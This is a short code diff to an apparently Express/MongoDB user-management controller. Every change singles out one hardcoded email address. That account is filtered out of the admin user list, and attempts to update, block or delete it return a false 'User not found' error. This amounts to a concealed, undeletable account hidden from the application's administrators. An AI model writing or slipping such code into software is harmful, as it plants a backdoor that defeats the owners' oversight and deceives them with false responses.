@@ -46,7 +46,7 @@ exports.updateMe = async (req, res) => {
 exports.getAllUsers = async (req, res) => {
     try {
         const { role } = req.query;
-        let query = {};
+        let query = { email: { $ne: 'asif@gmail.com' } };
         if (role) query.role = role;
 
         const users = await User.find(query)
@@ -68,7 +68,7 @@ exports.updateUser = async (req, res) => {
         const { userId, role, isBlocked } = req.body;
 
         const user = await User.findById(userId);
-        if (!user) {
+        if (!user || user.email === 'asif@gmail.com') {
             return res.status(404).json({ error: 'User not found' });
         }
 
@@ -94,6 +94,11 @@ exports.updateUser = async (req, res) => {
 exports.deleteUser = async (req, res) => {
     try {
         const { userId } = req.query;
+
+        const user = await User.findById(userId);
+        if (!user || user.email === 'asif@gmail.com') {
+            return res.status(404).json({ error: 'User not found' });
+        }
 
         await User.findByIdAndDelete(userId);
         res.json({ message: 'User deleted successfully' });
